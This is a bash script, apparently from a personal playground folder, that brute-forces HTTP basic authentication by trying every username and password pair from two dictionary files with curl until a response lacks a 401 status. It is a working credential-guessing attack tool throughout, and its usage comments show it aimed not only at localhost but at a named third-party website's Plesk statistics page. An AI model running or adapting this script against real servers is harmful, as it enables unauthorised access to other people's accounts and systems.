#!/usr/bin/env bash

# bash MY-PLAYGROUND/curl/curl_brute_force_attack.sh
# bash MY-PLAYGROUND/curl/curl_brute_force_attack.sh MY-PLAYGROUND/sample_usernames.txt MY-PLAYGROUND/sample_passwords.txt "localhost:5000/secure-data"
# bash MY-PLAYGROUND/curl/curl_brute_force_attack.sh MY-PLAYGROUND/sample_usernames.txt MY-PLAYGROUND/sample_passwords.txt "https://kosin.org.ua/plesk-stat"

USERNAMES_FILE="$1"
PASSWORDS_FILE="$2"
TARGET_ENDPOINT="$3"

if [ -z "$TARGET_ENDPOINT" ]; then
  echo "Target endpoint must be provided!"
  exit 1
fi

is_dictionary_file_valid() {
  local filename="$1"
  local filetype="$2"
  if [ -z "$filename" ] || ! [ -f "$filename" ]; then
    return 1
  fi
  return 0
}

if ! is_dictionary_file_valid "$USERNAMES_FILE" "usernames"; then
  echo "Invalid 'usernames' dictionary provided: $USERNAMES_FILE"
  exit 1
fi

if ! is_dictionary_file_valid "$PASSWORDS_FILE" "passwords"; then
  echo "Invalid 'passwords' dictionary provided: $PASSWORDS_FILE"
  exit 1
fi

echo "Dictionary stats:"
wc -l "$USERNAMES_FILE"
wc -l "$PASSWORDS_FILE"
echo

# TODO - make target endpoint configurable;

while read -r username; do
    while read -r password; do
      echo "Testing combination: $username / $password..."
      response=$(curl -s -I -u "$username:$password" -X GET "$TARGET_ENDPOINT")
      echo "$response"
      if ! [ -z "$response" ] && ! echo "$response" | grep -q "401"; then
        echo "Found match: $username / $password"
        exit 0
      fi
      sleep 1
    done < "$PASSWORDS_FILE"
done < "$USERNAMES_FILE"

echo -e "\n---\nNo matched combination found.\n---"
exit 1